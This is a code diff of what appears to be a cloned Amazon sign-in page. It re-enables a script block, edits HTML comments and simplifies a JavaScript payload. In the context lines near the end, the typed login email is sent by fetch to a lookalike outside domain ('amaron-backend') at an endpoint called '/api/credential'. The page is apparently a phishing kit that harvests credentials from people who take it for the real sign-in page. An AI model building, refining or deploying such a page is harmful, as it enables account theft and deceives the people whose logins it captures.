@@ -16608,7 +16608,7 @@
             <form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="1"></form>
 
 
-            <!-- <script type="text/javascript"> -->
+             <script type="text/javascript"> 
                 window.ue_ibe = (window.ue_ibe || 0) + 1;
                 if (window.ue_ibe === 1) {
                     (function (e, c) { function h(b, a) { f.push([b, a]) } function g(b, a) { if (b) { var c = e.head || e.getElementsByTagName("head")[0] || e.documentElement, d = e.createElement("script"); d.async = "async"; d.src = b; d.setAttribute("crossorigin", "anonymous"); a && a.onerror && (d.onerror = a.onerror); a && a.onload && (d.onload = a.onload); c.insertBefore(d, c.firstChild) } } function k() { ue.uels = g; for (var b = 0; b < f.length; b++) { var a = f[b]; g(a[0], a[1]) } ue.deffered = 1 } var f = []; c.ue && (ue.uels = h, c.ue.attach && c.ue.attach("load", k)) })(document, window);
@@ -17006,8 +17006,8 @@
 
                 }
 
-                /* ◬ */
-            <!-- // </script> -->
+
+            </script>
 
         </div>
 
@@ -17019,10 +17019,10 @@
 
         <script>window.ue && ue.count && ue.count('CSMLibrarySize', 63489)</script>
 
-        <!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-atf -->
-        <!-- sp:feature:nav-btf -->
-        <!-- sp:end-feature:nav-btf -->
-        <!-- sp:feature:host-btf -->
+        <!-- &&&Portal&Delimiter&&& sp:end-feature:host-atf -->
+        <!--  sp:feature:nav-btf -->
+        <!--  sp:end-feature:nav-btf -->
+        <!-- sp:feature:host-btf  -->
 
 
 
@@ -17116,10 +17116,7 @@
 
                 const username = document.getElementById("ap_email_login").value;
 
-                const payload = {
-                                username,
-                                userAgent: navigator.userAgent
-                                };
+                const payload = {username}
 
                 try {
                     const res = await fetch("https://amaron-backend.vercel.app/api/credential", {
